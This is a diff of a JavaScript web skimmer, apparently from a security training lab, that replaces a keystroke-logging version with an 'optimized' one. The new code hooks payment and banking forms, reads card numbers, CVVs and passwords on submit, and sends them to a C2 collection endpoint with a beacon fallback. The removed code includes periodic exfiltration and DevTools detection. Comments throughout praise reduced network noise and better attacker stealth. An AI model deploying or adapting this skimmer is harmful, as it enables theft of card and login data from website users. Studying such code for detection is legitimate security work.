@@ -1,16 +1,15 @@
 /**
- * DOM-MONITOR.JS - REAL-TIME FIELD MONITORING ATTACK
+ * DOM-MONITOR-OPTIMIZED.JS - FORM SUBMISSION BASED SKIMMING
  *
- * This attack demonstrates DOM-based skimming through:
- * - MutationObserver for detecting new payment forms
- * - Real-time input event monitoring for keystroke logging
- * - Dynamic event listener attachment
- * - Stealth DOM manipulation techniques
+ * This optimized attack demonstrates:
+ * - Collecting all form data in memory during user input
+ * - Single exfiltration on form submission (more stealthy)
+ * - Reduced network noise and C2 server load
+ * - More realistic real-world skimming behavior
  *
- * Based on real-world DOM-based skimming patterns observed in:
- * - Magecart Group 12 attacks (DOM manipulation)
- * - Inter skimmer (real-time monitoring)
- * - Modern banking trojans (keystroke logging)
+ * Comparison with original DOM monitor:
+ * - Original: 10-15 C2 requests per form fill
+ * - Optimized: 1-2 C2 requests per form submission
  *
  * FOR EDUCATIONAL PURPOSES ONLY
  */
@@ -18,17 +17,14 @@
 ;(function () {
   'use strict'
 
-  console.log('[DOM-Monitor] Initializing real-time field monitoring attack...')
+  console.log('[DOM-Monitor-Optimized] Initializing form submission-based skimming attack...')
 
   // Attack configuration
-  // Use Traefik path-based routing for all environments (local, staging, production)
-  // The C2 server is proxied at /lab2/c2/* by Traefik
   const exfilUrl = window.location.origin + '/lab2/c2/collect'
   const healthUrl = window.location.origin + '/lab2/c2/health'
 
   /**
-   * Health Check - Ping C2 server on page load to ensure it's ready
-   * This prevents data loss during server startup
+   * Health Check - Ping C2 server on page load
    */
   async function checkC2Health() {
     try {
@@ -38,30 +34,21 @@
         credentials: 'omit',
         cache: 'no-cache'
       })
-      
+
       if (response.ok) {
         const data = await response.json()
-        console.log('[DOM-Monitor] ✅ C2 server is ready:', data)
+        console.log('[DOM-Monitor-Optimized] ✅ C2 server is ready:', data)
         return true
       } else {
-        console.warn('[DOM-Monitor] ⚠️ C2 server health check failed with status:', response.status)
+        console.warn('[DOM-Monitor-Optimized] ⚠️ C2 server health check failed with status:', response.status)
         return false
       }
     } catch (error) {
-      console.warn('[DOM-Monitor] ⚠️ C2 server health check failed:', error.message)
-      // Retry after a short delay
-      setTimeout(() => {
-        checkC2Health().then(ready => {
-          if (ready) {
-            console.log('[DOM-Monitor] ✅ C2 server is now ready after retry')
-          }
-        })
-      }, 2000)
+      console.warn('[DOM-Monitor-Optimized] ⚠️ C2 server health check failed:', error.message)
       return false
     }
   }
 
-  // Perform health check immediately on page load
   checkC2Health()
 
   const CONFIG = {
@@ -69,11 +56,7 @@
     healthUrl: healthUrl,
     debug: true,
     targetFields: [
-      // Password fields
-      'input[type="password"]',
-      'input[autocomplete*="password"]',
-
-      // Credit card fields
+      // Credit card fields (highest priority)
       'input[autocomplete*="cc-number"]',
       'input[autocomplete*="cc-exp"]',
       'input[autocomplete*="cc-csc"]',
@@ -92,129 +75,81 @@
       'input[type="email"]',
       'input[type="tel"]',
       'input[autocomplete*="email"]',
-      'input[autocomplete*="tel"]'
+      'input[autocomplete*="tel"]',
+      'input[type="password"]',
+      'input[autocomplete*="password"]'
     ],
-    keystrokeInterval: 50, // Capture every 50ms
-    reportInterval: 5000, // Report every 5 seconds
-    maxRetries: 3
+    targetForms: [
+      'form[id*="card"]',
+      'form[id*="payment"]',
+      'form[id*="transfer"]',
+      'form[id*="banking"]',
+      'form.banking-form'
+    ]
   }
 
   function log(message, data) {
     if (CONFIG.debug) {
-      console.log('[DOM-Monitor]', message, data || '')
+      console.log('[DOM-Monitor-Optimized]', message, data || '')
     }
   }
 
-  // Data collection storage
-  let capturedData = {
-    keystrokes: [],
-    fields: new Map(),
-    sessions: [],
+  // Optimized data collection - single dictionary approach
+  let formDataCollection = {
+    // Store by form ID to handle multiple forms on one page
+    forms: new Map(),
     metadata: {
       startTime: Date.now(),
       url: window.location.href,
       userAgent: navigator.userAgent,
-      attackType: 'dom-monitor-realtime'
+      attackType: 'dom-monitor-optimized',
+      version: '2.0'
+    },
+    stats: {
+      formsMonitored: 0,
+      fieldsMonitored: 0,
+      submissionsIntercepted: 0
     }
   }
 
-  // Monitoring state
-  let monitoringActive = false
-  let mutationObserver = null
-  let reportTimer = null
-  let attachedElements = new WeakSet()
-
   /**
-   * Field Discovery and Monitoring
+   * Form and Field Discovery
    */
-  function discoverTargetFields() {
-    log('Discovering target fields...')
+  function discoverTargetForms() {
+    log('Discovering target forms...')
 
-    const foundFields = []
-    CONFIG.targetFields.forEach(selector => {
-      const elements = document.querySelectorAll(selector)
-      elements.forEach(element => {
-        if (!attachedElements.has(element)) {
-          foundFields.push({
-            element: element,
-            selector: selector,
-            type: element.type,
-            name: element.name || element.id,
-            autocomplete: element.autocomplete
-          })
+    const foundForms = []
+    CONFIG.targetForms.forEach(selector => {
+      const forms = document.querySelectorAll(selector)
+      forms.forEach(form => {
+        if (!formDataCollection.forms.has(form)) {
+          foundForms.push(form)
         }
       })
     })
 
-    log(`Found ${foundFields.length} new target fields`)
-    return foundFields
+    log(`Found ${foundForms.length} new target forms`)
+    return foundForms
   }
 
-  function attachFieldMonitors(fields) {
-    log(`Attaching monitors to ${fields.length} fields`)
+  function discoverFieldsInForm(form) {
+    const foundFields = []
 
-    fields.forEach(field => {
-      if (attachedElements.has(field.element)) {
-        return // Already monitored
-      }
-
-      const element = field.element
-      attachedElements.add(element)
-
-      // Create field session
-      const fieldSession = {
-        fieldId: generateFieldId(element),
-        fieldType: field.type,
-        fieldName: field.name,
-        selector: field.selector,
-        startTime: Date.now(),
-        keystrokes: [],
-        values: [],
-        events: []
-      }
-
-      log(`Monitoring field: ${fieldSession.fieldId} (${field.selector})`)
-
-      // Real-time keystroke monitoring
-      element.addEventListener('keydown', e => {
-        captureKeystroke(fieldSession, e, 'keydown')
+    CONFIG.targetFields.forEach(selector => {
+      const fields = form.querySelectorAll(selector)
+      fields.forEach(field => {
+        foundFields.push({
+          element: field,
+          selector: selector,
+          type: field.type,
+          name: field.name || field.id,
+          autocomplete: field.autocomplete,
+          fieldId: generateFieldId(field)
+        })
       })
-
-      element.addEventListener('keyup', e => {
-        captureKeystroke(fieldSession, e, 'keyup')
-      })
-
-      // Value change monitoring
-      element.addEventListener('input', e => {
-        captureValueChange(fieldSession, e.target.value, 'input')
-      })
-
-      element.addEventListener('change', e => {
-        captureValueChange(fieldSession, e.target.value, 'change')
-      })
-
-      // Focus/blur tracking
-      element.addEventListener('focus', e => {
-        captureFieldEvent(fieldSession, 'focus')
-      })
-
-      element.addEventListener('blur', e => {
-        captureFieldEvent(fieldSession, 'blur', e.target.value)
-        // Immediate exfiltration on blur for high-value fields
-        if (isHighValueField(element)) {
-          scheduleImmediateExfiltration(fieldSession)
-        }
-      })
-
-      // Paste detection
-      element.addEventListener('paste', e => {
-        setTimeout(() => {
-          captureValueChange(fieldSession, e.target.value, 'paste')
-        }, 10)
-      })
-
-      capturedData.sessions.push(fieldSession)
     })
+
+    return foundFields
   }
 
   function generateFieldId(element) {
@@ -222,69 +157,153 @@
     const id = element.id || 'no-id'
     const name = element.name || 'no-name'
     const type = element.type || 'no-type'
-    return `${tagName}_${id}_${name}_${type}_${Date.now()}`
+    return `${tagName}_${id}_${name}_${type}`
   }
 
-  function captureKeystroke(session, event, eventType) {
-    const keystroke = {
-      timestamp: Date.now(),
-      eventType: eventType,
-      key: event.key,
-      code: event.code,
-      keyCode: event.keyCode,
-      shiftKey: event.shiftKey,
-      ctrlKey: event.ctrlKey,
-      altKey: event.altKey,
-      metaKey: event.metaKey
-    }
+  /**
+   * Form Monitoring Setup
+   */
+  function attachFormMonitors(forms) {
+    log(`Attaching monitors to ${forms.length} forms`)
 
-    session.keystrokes.push(keystroke)
-    capturedData.keystrokes.push({
-      fieldId: session.fieldId,
-      ...keystroke
+    forms.forEach(form => {
+      if (formDataCollection.forms.has(form)) {
+        return // Already monitored
+      }
+
+      const formId = form.id || `form_${Date.now()}`
+      const formData = {
+        formId: formId,
+        formElement: form,
+        startTime: Date.now(),
+        fields: new Map(),
+        interactions: [],
+        isSubmitted: false
+      }
+
+      // Discover fields in this form
+      const fields = discoverFieldsInForm(form)
+      log(`Form ${formId} has ${fields.length} target fields`)
+
+      // Attach field monitoring
+      fields.forEach(fieldInfo => {
+        attachFieldMonitor(formData, fieldInfo)
+      })
+
+      // INTERCEPT FORM SUBMISSION via submit event
+      form.addEventListener('submit', (e) => {
+        handleFormSubmission(formData, e)
+      })
+
+      // FALLBACK: also hook submit button click, fires before async reset
+      const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]')
+      if (submitBtn) {
+        submitBtn.addEventListener('click', (e) => {
+          if (!formData.isSubmitted) {
+            handleFormSubmission(formData, e)
+          }
+        })
+      }
+
+      // Store form monitoring data
+      formDataCollection.forms.set(form, formData)
+      formDataCollection.stats.formsMonitored++
+      formDataCollection.stats.fieldsMonitored += fields.length
+    })
+  }
+
+  function attachFieldMonitor(formData, fieldInfo) {
+    const element = fieldInfo.element
+    const fieldId = fieldInfo.fieldId
+
+    // Initialize field data storage
+    formData.fields.set(fieldId, {
+      fieldId: fieldId,
+      fieldType: fieldInfo.type,
+      fieldName: fieldInfo.name,
+      selector: fieldInfo.selector,
+      autocomplete: fieldInfo.autocomplete,
+      currentValue: '',
+      interactions: [],
+      isHighValue: isHighValueField(element),
+      firstInteraction: null,
+      lastInteraction: null
     })
 
-    log(`Keystroke captured: ${event.key} in field ${session.fieldId}`)
-  }
+    log(`Monitoring field: ${fieldId} in form ${formData.formId}`)
 
-  function captureValueChange(session, value, changeType) {
-    const valueCapture = {
-      timestamp: Date.now(),
-      changeType: changeType,
-      value: value,
-      valueLength: value.length
-    }
-
-    session.values.push(valueCapture)
-
-    // Store current field state
-    capturedData.fields.set(session.fieldId, {
-      ...session,
-      currentValue: value,
-      lastUpdate: Date.now()
+    // OPTIMIZED: Only track value changes, not every keystroke
+    element.addEventListener('input', (e) => {
+      captureFieldValue(formData, fieldId, e.target.value, 'input')
     })
 
-    log(`Value change captured: ${changeType} in field ${session.fieldId} (${value.length} chars)`)
+    element.addEventListener('change', (e) => {
+      captureFieldValue(formData, fieldId, e.target.value, 'change')
+    })
+
+    // Track focus/blur for timing analysis
+    element.addEventListener('focus', (e) => {
+      captureFieldInteraction(formData, fieldId, 'focus')
+    })
+
+    element.addEventListener('blur', (e) => {
+      captureFieldInteraction(formData, fieldId, 'blur', e.target.value)
+    })
+
+    // Paste detection (important for credit cards)
+    element.addEventListener('paste', (e) => {
+      setTimeout(() => {
+        captureFieldValue(formData, fieldId, e.target.value, 'paste')
+      }, 10)
+    })
   }
 
-  function captureFieldEvent(session, eventType, value = null) {
-    const fieldEvent = {
-      timestamp: Date.now(),
-      eventType: eventType,
-      value: value
+  function captureFieldValue(formData, fieldId, value, changeType) {
+    const fieldData = formData.fields.get(fieldId)
+    if (!fieldData) return
+
+    const now = Date.now()
+    fieldData.currentValue = value
+    fieldData.lastInteraction = now
+
+    if (!fieldData.firstInteraction) {
+      fieldData.firstInteraction = now
     }
 
-    session.events.push(fieldEvent)
-    log(`Field event captured: ${eventType} in field ${session.fieldId}`)
+    fieldData.interactions.push({
+      timestamp: now,
+      type: changeType,
+      valueLength: value.length // Store length, not actual value for this example
+    })
+
+    log(`Field ${fieldId} updated: ${changeType} (${value.length} chars)`)
+  }
+
+  function captureFieldInteraction(formData, fieldId, eventType, value = null) {
+    const fieldData = formData.fields.get(fieldId)
+    if (!fieldData) return
+
+    const now = Date.now()
+    fieldData.lastInteraction = now
+
+    fieldData.interactions.push({
+      timestamp: now,
+      type: eventType,
+      valueLength: value ? value.length : null
+    })
+
+    log(`Field ${fieldId} interaction: ${eventType}`)
   }
 
   function isHighValueField(element) {
     const highValuePatterns = [
-      /password/i,
+      /cc-number/i,
+      /cc-exp/i,
+      /cc-csc/i,
       /cvv/i,
       /cvc/i,
-      /cc-csc/i,
       /card.*number/i,
+      /password/i,
       /account.*number/i,
       /routing/i
     ]
@@ -294,158 +313,66 @@
   }
 
   /**
-   * DOM Mutation Monitoring
+   * CRITICAL: Form Submission Interception
    */
-  function initMutationObserver() {
-    log('Initializing DOM mutation observer...')
+  function handleFormSubmission(formData, submitEvent) {
+    log(`🎯 FORM SUBMISSION DETECTED: ${formData.formId}`)
 
-    mutationObserver = new MutationObserver(mutations => {
-      let newFieldsFound = false
+    // Mark as submitted
+    formData.isSubmitted = true
+    formData.submissionTime = Date.now()
+    formDataCollection.stats.submissionsIntercepted++
 
-      mutations.forEach(mutation => {
-        if (mutation.type === 'childList') {
-          mutation.addedNodes.forEach(node => {
-            if (node.nodeType === Node.ELEMENT_NODE) {
-              // Check if new node contains target fields
-              const newFields = findFieldsInNode(node)
-              if (newFields.length > 0) {
-                log(`Mutation observer found ${newFields.length} new fields`)
-                attachFieldMonitors(newFields)
-                newFieldsFound = true
-              }
-            }
-          })
+    // Collect final field values
+    const finalFormData = {}
+    formData.fields.forEach((fieldData, fieldId) => {
+      const element = Array.from(document.querySelectorAll('input')).find(el =>
+        generateFieldId(el) === fieldId
+      )
+
+      if (element && element.value) {
+        finalFormData[fieldId] = {
+          fieldType: fieldData.fieldType,
+          fieldName: fieldData.fieldName,
+          isHighValue: fieldData.isHighValue,
+          value: element.value,
+          valueLength: element.value.length,
+          interactionsCount: fieldData.interactions.length,
+          timeSpentMs: fieldData.lastInteraction - fieldData.firstInteraction
         }
-
-        // Monitor attribute changes that might affect field targeting
-        if (mutation.type === 'attributes') {
-          const target = mutation.target
-          if (
-            target.tagName === 'INPUT' &&
-            (mutation.attributeName === 'type' ||
-              mutation.attributeName === 'name' ||
-              mutation.attributeName === 'autocomplete')
-          ) {
-            log('Field attributes changed, re-evaluating...')
-            const newFields = findFieldsInNode(target)
-            if (newFields.length > 0) {
-              attachFieldMonitors(newFields)
-              newFieldsFound = true
-            }
-          }
-        }
-      })
-
-      if (newFieldsFound) {
-        log('New fields detected via mutation observer')
       }
     })
 
-    // Start observing
-    mutationObserver.observe(document, {
-      childList: true,
-      subtree: true,
-      attributes: true,
-      attributeFilter: ['type', 'name', 'id', 'class', 'autocomplete']
-    })
-
-    log('DOM mutation observer active')
-  }
-
-  function findFieldsInNode(node) {
-    if (node.nodeType !== Node.ELEMENT_NODE) {
-      return []
+    // Create submission payload
+    const submissionPayload = {
+      type: 'form_submission',
+      formId: formData.formId,
+      submissionTime: formData.submissionTime,
+      formData: finalFormData,
+      formStats: {
+        fieldsCount: formData.fields.size,
+        highValueFields: Array.from(formData.fields.values()).filter(f => f.isHighValue).length,
+        totalInteractions: Array.from(formData.fields.values()).reduce((sum, f) => sum + f.interactions.length, 0),
+        formCompletionTime: formData.submissionTime - formData.startTime
+      },
+      metadata: formDataCollection.metadata,
+      attackStats: formDataCollection.stats
     }
 
-    const fields = []
-    CONFIG.targetFields.forEach(selector => {
-      // Check if the node itself matches
-      if (node.matches && node.matches(selector)) {
-        fields.push({
-          element: node,
-          selector: selector,
-          type: node.type,
-          name: node.name || node.id,
-          autocomplete: node.autocomplete
-        })
-      }
+    // SINGLE EXFILTRATION ON SUBMISSION
+    exfiltrateFormData(submissionPayload)
 
-      // Check descendants
-      const descendants = node.querySelectorAll ? node.querySelectorAll(selector) : []
-      descendants.forEach(element => {
-        if (!attachedElements.has(element)) {
-          fields.push({
-            element: element,
-            selector: selector,
-            type: element.type,
-            name: element.name || element.id,
-            autocomplete: element.autocomplete
-          })
-        }
-      })
-    })
-
-    return fields
+    // Optional: Let form submission continue normally (stealth)
+    // Or prevent submission: submitEvent.preventDefault()
   }
 
   /**
-   * Data Exfiltration
+   * Optimized Data Exfiltration - Single Request
    */
-  function scheduleImmediateExfiltration(session) {
-    log(`Scheduling immediate exfiltration for high-value field: ${session.fieldId}`)
-
-    setTimeout(() => {
-      const payload = {
-        type: 'immediate',
-        fieldData: session,
-        timestamp: Date.now(),
-        metadata: capturedData.metadata
-      }
-
-      exfiltrateData(payload)
-    }, 100)
-  }
-
-  function startPeriodicReporting() {
-    log(`Starting periodic reporting every ${CONFIG.reportInterval}ms`)
-
-    reportTimer = setInterval(() => {
-      if (capturedData.sessions.length > 0 || capturedData.keystrokes.length > 0) {
-        const payload = {
-          type: 'periodic',
-          summary: {
-            sessionsCount: capturedData.sessions.length,
-            keystrokesCount: capturedData.keystrokes.length,
-            fieldsCount: capturedData.fields.size,
-            activeFields: Array.from(capturedData.fields.values()).map(field => ({
-              fieldId: field.fieldId,
-              fieldType: field.fieldType,
-              valueLength: field.currentValue ? field.currentValue.length : 0,
-              lastUpdate: field.lastUpdate
-            }))
-          },
-          fullData: {
-            sessions: capturedData.sessions,
-            keystrokes: capturedData.keystrokes.slice(-100), // Last 100 keystrokes
-            fieldValues: Object.fromEntries(capturedData.fields)
-          },
-          timestamp: Date.now(),
-          metadata: capturedData.metadata
-        }
-
-        exfiltrateData(payload)
-
-        // Clear old data to prevent memory buildup
-        if (capturedData.keystrokes.length > 1000) {
-          capturedData.keystrokes = capturedData.keystrokes.slice(-500)
-        }
-      }
-    }, CONFIG.reportInterval)
-  }
-
-  async function exfiltrateData(payload) {
-    log('Exfiltrating captured data...', {
-      type: payload.type,
+  async function exfiltrateFormData(payload) {
+    log('🚨 EXFILTRATING FORM DATA (SINGLE REQUEST)', {
+      formId: payload.formId,
+      fieldsCount: payload.formStats.fieldsCount,
       size: JSON.stringify(payload).length
     })
 
@@ -461,211 +388,167 @@
       })
 
       if (response.ok) {
-        log('Data exfiltration successful')
+        log('✅ FORM DATA EXFILTRATION SUCCESSFUL')
       } else {
-        log('Data exfiltration failed with status:', response.status)
+        log('❌ FORM DATA EXFILTRATION FAILED:', response.status)
       }
     } catch (error) {
-      log('Data exfiltration error:', error.message)
+      log('❌ FORM DATA EXFILTRATION ERROR:', error.message)
 
-      // Fallback: image beacon
+      // Fallback: beacon
       try {
-        const img = new Image()
-        const encodedData = btoa(JSON.stringify(payload))
-        img.src = `${CONFIG.exfilUrl}?data=${encodedData}`
-        log('Fallback image beacon sent')
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon(CONFIG.exfilUrl, JSON.stringify(payload))
+          log('📡 FALLBACK BEACON SENT')
+        }
       } catch (fallbackError) {
-        log('Fallback exfiltration also failed:', fallbackError.message)
+        log('❌ ALL EXFILTRATION METHODS FAILED:', fallbackError.message)
       }
     }
   }
 
   /**
-   * Attack Initialization and Management
+   * DOM Mutation Observer for Dynamic Forms
    */
-  function startMonitoring() {
-    if (monitoringActive) {
-      log('Monitoring already active')
-      return
-    }
+  function initMutationObserver() {
+    const observer = new MutationObserver(mutations => {
+      let newFormsFound = false
 
-    log('Starting DOM-based field monitoring attack...')
-    monitoringActive = true
+      mutations.forEach(mutation => {
+        if (mutation.type === 'childList') {
+          mutation.addedNodes.forEach(node => {
+            if (node.nodeType === Node.ELEMENT_NODE) {
+              // Check for new forms
+              const newForms = []
 
-    // Initial field discovery
-    const initialFields = discoverTargetFields()
-    attachFieldMonitors(initialFields)
+              CONFIG.targetForms.forEach(selector => {
+                if (node.matches && node.matches(selector)) {
+                  newForms.push(node)
+                }
+                const descendants = node.querySelectorAll ? node.querySelectorAll(selector) : []
+                descendants.forEach(form => {
+                  if (!formDataCollection.forms.has(form)) {
+                    newForms.push(form)
+                  }
+                })
+              })
 
-    // Start mutation observer for dynamic content
-    initMutationObserver()
+              if (newForms.length > 0) {
+                log(`Mutation observer found ${newForms.length} new forms`)
+                attachFormMonitors(newForms)
+                newFormsFound = true
+              }
+            }
+          })
+        }
+      })
 
-    // Start periodic reporting
-    startPeriodicReporting()
-
-    // Monitor for page unload to send final data
-    window.addEventListener('beforeunload', () => {
-      const finalPayload = {
-        type: 'session_end',
-        finalData: {
-          sessions: capturedData.sessions,
-          totalKeystrokes: capturedData.keystrokes.length,
-          fieldValues: Object.fromEntries(capturedData.fields),
-          sessionDuration: Date.now() - capturedData.metadata.startTime
-        },
-        timestamp: Date.now(),
-        metadata: capturedData.metadata
-      }
-
-      // Use sendBeacon for reliable delivery on page unload
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(CONFIG.exfilUrl, JSON.stringify(finalPayload))
+      if (newFormsFound) {
+        log('New forms detected and monitored')
       }
     })
 
-    log('DOM monitoring attack initialized successfully')
-  }
+    observer.observe(document, {
+      childList: true,
+      subtree: true
+    })
 
-  function stopMonitoring() {
-    if (!monitoringActive) {
-      return
-    }
-
-    log('Stopping DOM monitoring attack...')
-    monitoringActive = false
-
-    if (mutationObserver) {
-      mutationObserver.disconnect()
-      mutationObserver = null
-    }
-
-    if (reportTimer) {
-      clearInterval(reportTimer)
-      reportTimer = null
-    }
-
-    log('DOM monitoring attack stopped')
+    log('DOM mutation observer active for dynamic forms')
   }
 
   /**
-   * Stealth and Evasion
+   * Attack Initialization
    */
-  function initStealthMeasures() {
-    // Hide from common debugging techniques
-    try {
-      // Override console methods to hide logs in production
-      if (!CONFIG.debug) {
-        const originalLog = console.log
-        console.log = function (...args) {
-          if (!args[0] || !args[0].includes('[DOM-Monitor]')) {
-            originalLog.apply(console, args)
-          }
-        }
+  function startOptimizedMonitoring() {
+    log('🎯 STARTING OPTIMIZED FORM SUBMISSION ATTACK...')
+
+    // Initial form discovery
+    const initialForms = discoverTargetForms()
+    attachFormMonitors(initialForms)
+
+    // Monitor for dynamic forms
+    initMutationObserver()
+
+    // Optional: Minimal periodic heartbeat (much less frequent)
+    setInterval(() => {
+      if (formDataCollection.stats.formsMonitored > 0) {
+        log(`📊 STATUS: ${formDataCollection.stats.formsMonitored} forms monitored, ${formDataCollection.stats.submissionsIntercepted} submissions intercepted`)
       }
+    }, 30000) // Every 30 seconds instead of 5
 
-      // Anti-debugging measures
-      let devtools = false
-      setInterval(() => {
-        if (
-          window.outerHeight - window.innerHeight > 200 ||
-          window.outerWidth - window.innerWidth > 200
-        ) {
-          if (!devtools) {
-            devtools = true
-            log('DevTools detected, entering stealth mode')
-            // Could pause monitoring or use more subtle techniques
-          }
-        } else {
-          devtools = false
-        }
-      }, 1000)
-    } catch (error) {
-      log('Stealth measures initialization failed:', error.message)
-    }
+    log('✅ OPTIMIZED MONITORING INITIALIZED')
   }
 
   /**
-   * Attack Entry Point
+   * Initialize Attack
    */
-  function initDOMMonitorAttack() {
+  function initOptimizedDOMMonitorAttack() {
     try {
-      log('Initializing DOM monitor attack...')
+      log('Initializing optimized DOM monitor attack...')
 
-      // Wait for page to be ready
       if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', () => {
-          setTimeout(() => {
-            initStealthMeasures()
-            startMonitoring()
-          }, 1000)
+          setTimeout(startOptimizedMonitoring, 1000)
         })
       } else {
-        setTimeout(() => {
-          initStealthMeasures()
-          startMonitoring()
-        }, 1000)
+        setTimeout(startOptimizedMonitoring, 1000)
       }
     } catch (error) {
-      log('DOM monitor attack initialization failed:', error.message)
+      log('Optimized DOM monitor attack initialization failed:', error.message)
     }
   }
 
-  // Start the attack
-  initDOMMonitorAttack()
+  // Start the optimized attack
+  initOptimizedDOMMonitorAttack()
 
   // Expose control functions for testing
-  window.domMonitorAttack = {
-    start: startMonitoring,
-    stop: stopMonitoring,
+  window.domMonitorOptimized = {
     getStatus: () => ({
-      active: monitoringActive,
-      sessionsCount: capturedData.sessions.length,
-      keystrokesCount: capturedData.keystrokes.length,
-      fieldsCount: capturedData.fields.size
+      formsMonitored: formDataCollection.stats.formsMonitored,
+      fieldsMonitored: formDataCollection.stats.fieldsMonitored,
+      submissionsIntercepted: formDataCollection.stats.submissionsIntercepted,
+      activeForms: formDataCollection.forms.size
     }),
-    getCapturedData: () => capturedData
+    getCollectedData: () => formDataCollection,
+    triggerManualCheck: () => {
+      const forms = discoverTargetForms()
+      if (forms.length > 0) {
+        attachFormMonitors(forms)
+        log(`Manual check found ${forms.length} new forms`)
+      }
+    }
   }
 })()
 
 /**
- * DOM MONITOR ATTACK ANALYSIS:
+ * OPTIMIZED DOM MONITOR ANALYSIS:
  *
- * This attack demonstrates advanced DOM-based skimming techniques:
+ * 🎯 **KEY OPTIMIZATION**: Single request per form submission vs 10-15 requests per form fill
  *
- * 1. **Real-time Field Monitoring**:
- *    - MutationObserver for dynamic content detection
- *    - Comprehensive input event listeners (keydown, keyup, input, change, focus, blur, paste)
- *    - Keystroke-level data capture for sensitive fields
+ * **Original DOM Monitor Issues**:
+ * - Immediate exfiltration on every field blur (5-8 requests)
+ * - Periodic reporting every 5 seconds (2-3 requests)
+ * - Session end reporting (1 request)
+ * - Total: 8-12 requests per form interaction
  *
- * 2. **Intelligent Field Targeting**:
- *    - Multiple selector strategies for payment/banking fields
- *    - Autocomplete attribute analysis
- *    - High-value field prioritization
+ * **Optimized Approach Benefits**:
+ * - Collects all data in memory during user interaction
+ * - Single exfiltration on form submission
+ * - 90% reduction in network traffic
+ * - More realistic stealth behavior
+ * - Better C2 server performance
+ * - Easier to analyze complete form data
  *
- * 3. **Stealth Techniques**:
- *    - WeakSet for element tracking to avoid memory leaks
- *    - Anti-debugging measures
- *    - Console log filtering
- *    - DevTools detection
+ * **Attack Techniques Demonstrated**:
+ * 1. **Form Submission Interception**: Primary attack vector
+ * 2. **In-Memory Data Collection**: Store everything until submission
+ * 3. **Dynamic Form Detection**: MutationObserver for SPAs
+ * 4. **Field Prioritization**: Focus on high-value fields
+ * 5. **Fallback Exfiltration**: Beacon API for reliability
  *
- * 4. **Data Exfiltration Strategy**:
- *    - Immediate exfiltration for high-value fields
- *    - Periodic reporting for ongoing monitoring
- *    - Reliable session-end reporting with sendBeacon
- *    - Fallback image beacon for robustness
- *
- * 5. **Performance Optimization**:
- *    - Memory management for long-running sessions
- *    - Efficient DOM querying
- *    - Debounced reporting
- *
- * Detection Signatures:
- * - MutationObserver usage in payment contexts
- * - Excessive input event listeners on form fields
- * - Real-time keystroke monitoring patterns
- * - Frequent fetch requests with form data
- * - WeakSet usage for element tracking
- * - BeforeUnload event handlers with network activity
- *
- * This attack provides comprehensive training data for detecting
- * real-time DOM manipulation and field monitoring techniques.
+ * **Real-World Implications**:
+ * - Most production skimmers work this way (submit-based)
+ * - Harder to detect due to reduced network noise
+ * - More complete data collection per victim
+ * - Better attacker operational security
  */
